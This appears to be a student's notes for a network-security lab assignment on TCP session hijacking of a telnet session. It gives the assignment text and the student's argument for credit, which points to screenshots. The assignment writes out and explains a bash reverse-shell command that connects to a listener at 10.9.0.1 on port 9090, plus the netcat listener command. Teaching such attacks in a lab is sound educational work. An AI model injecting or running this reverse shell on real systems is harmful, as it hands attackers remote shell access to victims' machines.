## Question

Q4 Task 4: Creating Reverse Shell using TCP Session Hijacking
30 Points
Grading comment:

When attackers are able to inject a command to the victim’s machine using TCP session hijacking, they are not interested in running one simple command on the victim machine; they are interested in running many commands. Obviously, running these commands all through TCP session hijacking is inconvenient. What attackers want to achieve is to use the attack to set up a back door, so they can use this back door to conveniently conduct further damages.

A typical way to set up back doors is to run a reverse shell from the victim machine to give the attack the shell access to the victim machine. Reverse shell is a shell process running on a remote machine, connecting back to the attacker’s machine. This gives an attacker a convenient way to access a remote machine once it has been compromised.

In the following, we will show how we can set up a reverse shell and how we can directly run a command on the victim machine (i.e. the server machine). In the TCP session hijacking attack, attackers cannot directly run a command on the victim machine, so their jobs is to run a reverse-shell command through the session hijacking attack. In this task, students need to demonstrate that they can achieve this goal. 

To have a bash shell on a remote machine and connect back to the attacker’s machine, the attacker needs a process waiting for some connection on a given port. In this example, we will use netcat. This program allows us to specify a port number and can listen for a connection on that port. In the following demo, we show two windows, each one is from a different machine. The top window is the attack machine 10.9.0.1, which runs netcat (nc for short), listening on port 9090. The bottom window is the victim machine 10.9.0.5, and we type the reverse shell command. As soon as the reverse shell gets executed, the top window indicates that we get a shell. This is a reverse shell, i.e., it runs on 10.9.0.5

We provide a brief description on the reverse shell command in the following.

    • "/bin/bash -i": i stands for interactive, meaning that the shell must be interactive (must provide a shell prompt)

    "> /dev/tcp/10.9.0.1/9090": This causes the output (stdout) of the shell to be redirected
    to the tcp connection to 10.9.0.1’s port 9090. The output stdout is represented by file descriptor number 1.

    "0<&1": File descriptor 0 represents the standard input (stdin). This causes the stdin for the shell to be obtained from the tcp connection.
    "2>&1": File descriptor 2 represents standard error stderr. This causes the error output to be redirected to the tcp connection.

In summary, "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" starts a bash shell,
with its input coming from a tcp connection, and its standard and error outputs being redirected to the same tcp connection. 

In the demo shown above, when the bash shell command is executed on 10.9.0.5, it connects back to the netcat process started on 10.9.0.1. This is confirmed via the "Connection received on 10.9.0.5" message displayed by netcat.

The description above shows how you can set up a reverse shell if you have the access to the target machine, which is the telnet server in our setup, but in this task, you do not have such an access. Your task is to launch a TCP session hijacking attack on an existing telnet session between a user and the target server. You need to inject your malicious command into the hijacked session, so you can get a reverse shell on the target server.

- Please show your code (hardcoded values)
- show the attack in progress
- Wireshark frame showing the SEQ/ACK number that you copied from
- Wireshark frame showing the inject code, and showing the SEQ and ACK number
- Telnet connection failing
- netcat output
- File created on the victim's host using netcat (or some other attack)

## Argument

The right panel of these screenshots displays the Python hijacking script.
The code screenshot I submitted:
![[Screenshot 2025-06-04 at 1.48.49 PM.png]]

From the same screenshot we can see what docker containers we have, namely:
![[Screenshot 2025-06-04 at 1.49.28 PM.png | 400]]

Even though it is hard to follow, the collective set of screenshots illustrates the stages of the attack.

Tis demonstrates the initial setup: 
![[Screenshot 2025-06-04 at 2.48.01 PM.png]]
where, the netcat listener (netcat -nlvp 9090) is started on the attacker machine (10.9.0.1) in the bottom-left terminal, and a Telnet session from seed@VM to 10.9.0.6 is active in the middle-left terminal.
![[Screenshot 2025-06-04 at 2.44.41 PM.png]]

Then we see the outcome of the hijack script:
![[Screenshot 2025-06-04 at 2.52.43 PM 1.png]]

And as we saw before, 51 is our victim and we did get a reverse shell onto them from our seed attacker!!

Finally, in our Wireshark, we see the successful establishment of the reverse shell and that the packet was successfully crafted and sent with the correct SEQ/ACK numbers.
![[Screenshot_2025-03-10_at_8.46.15_PM.jpg]]